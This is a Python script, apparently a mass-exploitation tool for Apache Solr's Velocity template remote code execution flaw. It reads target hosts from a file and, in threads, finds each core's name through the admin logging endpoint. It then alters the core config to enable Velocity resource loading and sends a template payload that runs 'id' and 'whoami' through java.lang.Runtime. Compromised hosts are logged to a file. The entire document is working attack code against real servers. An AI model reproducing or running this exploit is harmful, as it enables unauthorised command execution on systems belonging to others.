import requests,re,time
from threading import Thread
def getip():
	ip_list = []
	with open('solr.txt','r') as f:
		for i in f:
			if '\n' in i:
				ip_list.append(f'http://{i[:-1]}/solr/')
			else:
				ip_list.append(f'http://{i}/solr/')
	return ip_list
	

def upconfig(url, core):

    url += core+"/config"
    headers = {"Content-Type": "application/json"}
    post_data = """
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "core": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
    """
    conn = requests.request("POST", url, data = post_data, headers = headers,timeout = 10)





def attack(url):
	for i in range(3):
		try:
			log_time = str(time.time()).split('.')[0] + str(time.time()).split('.')[1][:3]
			r = requests.get(url)
			if r.status_code == 200:
				r = requests.get(f'{url}admin/info/logging?_={log_time}&since=0&wt=json',timeout = 5,verify=False).text
				core = re.search('"core":"x:(.*?)"}',r).group(1)	
			else :
				return 1
		
			upconfig(url,core)
		
		
			payload = url + f'{core}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
			restart = requests.get(payload).text
			#print(restart)
		
			if 'uid' in restart:
				payload = url + f'{core}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
				restart = requests.get(payload).text
				user = restart.split('0')[1]
				with open('have_attack.txt','a') as f:
					f.write(f'[*]url:{payload}\n[*]code_restart:{user}\n\n')
				print(f'[*]info:{url} -----> {user}')
				break
		except:
			pass
	


if __name__ == '__main__':
	ip_list = getip()
	for i in ip_list:
		try:
			t = Thread(target = attack,args = (i,))
			t.start()
		except:
			pass
	t.join()
